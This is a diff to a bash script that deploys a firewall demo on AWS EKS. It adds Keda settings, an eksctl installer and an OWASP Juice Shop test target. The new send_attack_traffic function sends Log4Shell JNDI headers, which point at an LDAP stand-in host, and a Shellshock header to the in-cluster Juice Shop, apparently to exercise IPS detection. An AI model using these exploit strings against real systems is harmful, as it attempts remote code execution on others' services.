@@ -42,6 +42,10 @@ saveVariableForEdit() {
         echo "export EC2_SERVICE=\"$EC2_SERVICE\""
         echo "export IAM_PREFIX=\"$IAM_PREFIX\""
         
+	echo "#helm Varible"
+	echo "# -----------------"
+	echo "export enableKeda=\"$enableKeda\""
+
         # Add MYIMAGEREPO only for China region
         if [ "$region" == "china" ]; then
             echo "export MYIMAGEREPO=\"$MYIMAGEREPO\""
@@ -140,6 +144,11 @@ set_common_variables() {
         "DST_TCP_PORT_TOCHECK" \
         "443" \
         "Destination TCP Port to Check")
+
+    enableKeda=$(get_env_or_default \
+	"enableKeda" \
+	"true" \
+	"enable Keda based scaling")
 }
 
 # Set AWS profile and region for aws china
@@ -210,6 +219,56 @@ set_global_aws_variable() {
         exit 1
     fi
 }
+
+function upgradeLatestEKSCTL () {
+ARCH=$(uname -m)
+
+# Check if the architecture is either amd64 or arm64
+if [ "$ARCH" == "x86_64" ]; then
+    ARCH="amd64"
+elif [ "$ARCH" == "arm64" ]; then
+    ARCH="arm64"
+else
+    echo "Unsupported architecture: $ARCH. Only amd64 and arm64 are supported."
+    exit 1
+fi
+PLATFORM=$(uname -s)_$ARCH
+echo $PLATFORM
+
+# Check if eksctl is already installed and its location
+if command -v eksctl &> /dev/null; then
+    EXISITNG_EKSCTL_PATH=$(which eksctl)
+    echo "eksctl is already installed at $EXISITNG_EKSCTL_PATH"
+    # Optionally, you could remove the old version before upgrading
+    #sudo rm $EXISITNG_EKSCTL_PATH
+    #echo "Removing the old version of eksctl."
+else
+    echo "eksctl is not installed."
+fi
+
+# Download the latest version of eksctl
+curl -sLO "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_$PLATFORM.tar.gz"
+
+# (Optional) Verify checksum
+curl -sL "https://github.com/eksctl-io/eksctl/releases/latest/download/eksctl_checksums.txt" | grep $PLATFORM | sha256sum --check
+
+# Extract the new version and clean up
+tar -xzf eksctl_$PLATFORM.tar.gz -C /tmp && rm eksctl_$PLATFORM.tar.gz
+
+# Move the new eksctl binary to the previous eksctl location or /usr/local/bin if not installed
+if [ -n "$EXISITNG_EKSCTL_PATH" ]; then
+    # Move new eksctl to the existing location
+    sudo mv /tmp/eksctl $EXISITNG_EKSCTL_PATH
+    echo "Replaced eksctl with the new version at $EXISITNG_EKSCTL_PATH"
+else
+    # If eksctl wasn't installed previously, move to /usr/local/bin
+    sudo mv /tmp/eksctl /usr/local/bin
+    echo "Installed eksctl to /usr/local/bin"
+fi
+
+# Verify installation
+eksctl version
+} 
 
 check_prerequisites() {
     #local aws_profile="${1:-default}"  # Use provided profile or default
@@ -364,14 +423,108 @@ check_aws_profile() {
     return 0
 }
 
-deploy_demo_pod() {
+function deploy_demo_pod() {
 echo kubectl apply -f ${ALTERNATIVEDOWNLOADURL}/diag.yaml 
 kubectl apply -f ${ALTERNATIVEDOWNLOADURL}/diag.yaml
 kubectl rollout status deployment diag 
 echo sleep 10 
 sleep 10
 check_network_connectivity ${DST_IP_TOCHECK} ${DST_TCP_PORT_TOCHECK}
+create_and_apply_juiceshop_yaml
 }
+
+function send_attack_traffic() {
+echo send attack traffic to juniceshop
+service_address="juiceshop-service.security.svc.cluster.local"
+
+payload='curl --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+echo run_curl_in_pod "$payload" "$service_address"
+run_curl_in_pod "$payload" "$service_address"
+
+payload='curl --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
+echo run_curl_in_pod "$payload" "$service_address"
+#run_curl_in_pod "$payload" "$service_address"
+
+sleep 10
+payload='curl --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+echo run_curl_in_pod "$payload" "$service_address"
+run_curl_in_pod "$payload" "$service_address"
+}
+
+function run_curl_in_pod() {
+    # Parameters
+    LOCAL_CURL_COMMAND=$1
+    JUICE_SHOP_SVC=$2
+
+    # Get the pod name with label app=diag
+    POD_NAME=$(kubectl get pods -l app=diag -o jsonpath='{.items[0].metadata.name}')
+    
+    if [ -z "$POD_NAME" ]; then
+        echo "No pod found with label app=diag"
+        exit 1
+    fi
+
+    # Run the curl command inside the pod
+    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND http://$JUICE_SHOP_SVC:3000/api/Products"
+}
+
+function create_and_apply_juiceshop_yaml() {
+    # Define the YAML file path
+    YAML_FILE="juiceshop_deployment.yaml"
+
+    # Create the YAML content and save it to the file
+    cat <<EOF > $YAML_FILE
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: security
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: juiceshop
+  namespace: security
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: juiceshop
+  template:
+    metadata:
+      labels:
+        app: juiceshop
+    spec:
+      containers:
+        - name: juiceshop
+          image: bkimminich/juice-shop:latest
+          ports:
+            - containerPort: 3000
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: juiceshop-service
+  namespace: security
+spec:
+  selector:
+    app: juiceshop
+  ports:
+    - protocol: TCP
+      port: 3000
+      targetPort: 3000
+EOF
+
+    # Apply the YAML file to Kubernetes
+    kubectl apply -f $YAML_FILE
+
+    # Wait for the deployment to be ready
+    kubectl rollout status deployment/juiceshop -n security --timeout=300s
+
+    echo "JuiceShop deployment is ready."
+}
+
 
 deploykeda() {
     local region=$1
@@ -802,7 +955,7 @@ deployCFOSandAgentChinaAWS() {
             --set routeManager.image.pullPolicy=Always \
             --set dnsConfig.nameserver="$dnsAddress" \
             --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
-            --set kedaScaling.enabled=true \
+            --set kedaScaling.enabled=$enableKeda \
             --set cFOSmetricExample.enabled=true \
             --set persistence.enabled=true \
             --set initContainers.image.repository=${MYIMAGEREPO}/busybox; then
@@ -1377,6 +1530,8 @@ print_usage() {
     echo "  deployDemoPod                       - Deploy protected demo application pod and check connectivity"
     echo "  checkPrerequisites                  - Check Whether the program is able to run" 
     echo "  saveconfig                          - Save Default Variable for edit"
+    echo "  sendAttackToClusterIP               - Send ips attack to juiceshop clusterip address"
+    echo "  installDep                          - install Dependencies -eksctl ."
     echo "Region (optional):"
     echo "  china                      - Use China region settings"
     echo "  global                     - Use Global region settings (default)"
@@ -1451,12 +1606,19 @@ case "$1" in
         check_license_file || exit 1 
         deploy_cfos_and_agent "$2" || exit 1
         deploy_demo_pod  || exit 1
+	send_attack_traffic || exit 1 
         ;;
     checkPrerequisites)
         check_prerequisites || exit 1
         ;;
-     saveconfig)
+    installDep)
+	upgradeLatestEKSCTL || exist 1
+	;;
+    saveconfig)
         saveVariableForEdit "$2"
+	;;
+    sendAttackToClusterIP)
+       send_attack_traffic || exit 1
         ;;
     *)
         print_usage
